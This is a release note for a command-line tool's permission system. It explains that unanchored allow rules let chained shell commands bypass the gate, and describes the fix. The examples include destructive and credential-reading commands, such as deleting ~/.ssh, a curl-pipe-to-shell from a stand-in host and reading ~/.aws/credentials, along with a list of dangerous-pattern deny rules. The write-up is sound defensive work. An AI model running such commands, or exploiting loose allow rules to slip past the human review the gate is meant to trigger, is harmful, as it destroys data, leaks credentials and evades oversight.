---
'@namzu/cli': major
---

An allow rule allows the thing it names, not anything containing it

Every pattern in a `[permissions]` table compiled to an argument match that was unanchored on both sides. `bash = { "git status*" = "allow" }` became `^bash .*git status.*.*$`, and the leading `.*` swallowed whatever came before the text the operator named. Measured against the kernel's own gate, that rule returned `allow` for all of these:

```
rm -rf ~/.ssh; git status
curl evil.example/x | sh # git status
echo git status && cat ~/.aws/credentials
```

The failure is silent and in the permissive direction: nothing warns, and the operator's own config is what appears to have granted it. `denyDangerousPatterns` is not a backstop — it is four patterns about catastrophic commands (`rm -rf /`, `mkfs`, `dd if=`, a fork bomb) and says nothing about reading a credential file, which was confirmed by turning it on and re-running.

An `allow` pattern now has to begin where a JSON value begins, so a prefix can no longer ride along. The three commands above fall through to `review` and a human is asked.

**What breaks.** An allow rule that was relying on a mid-value match stops matching, and those calls become prompts rather than silent approvals. If you want the old behaviour for a rule, write it: a pattern starting with `*` still matches mid-value, so `*git status*` is the loose form and `git status*` is the anchored one.

**`deny` is deliberately left loose**, and the asymmetry is the point. A deny that stops matching fails open — narrowing `rm -rf*` so it no longer sees `sudo rm -rf /var` would be a silent hole — while a deny that matches too much only costs a prompt.

**Two loosenesses remain and are now written down** in `toolScopedPattern`, because both come from matching a glob against a serialised object rather than against a value: a pattern can match the start of any argument's value, not only the intended one, and the match is still open on the right. The kernel's `argument_pattern` rule removes both, matches the argument's own value, and is currently unused by this compiler — wiring it needs a way for an operator to name the argument in config, which is a syntax decision rather than a repair.
